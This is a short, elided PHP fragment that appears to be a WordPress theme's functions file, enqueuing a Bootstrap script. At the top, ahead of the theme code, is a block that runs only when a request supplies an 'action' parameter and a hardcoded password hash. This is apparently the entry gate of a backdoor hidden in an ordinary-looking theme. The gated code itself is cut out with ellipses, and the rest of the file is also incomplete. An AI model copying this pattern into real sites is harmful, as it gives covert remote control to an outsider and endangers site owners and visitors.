<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '60adce9982b36675b10b946bd0164a7a'))
	{
...
function theme_resources() {
    ...
    wp_enqueue_script('strap-js', get_theme_file_uri('js/bootstrap/bootstrap.min.js'), array('jquery'), '1.0', true);
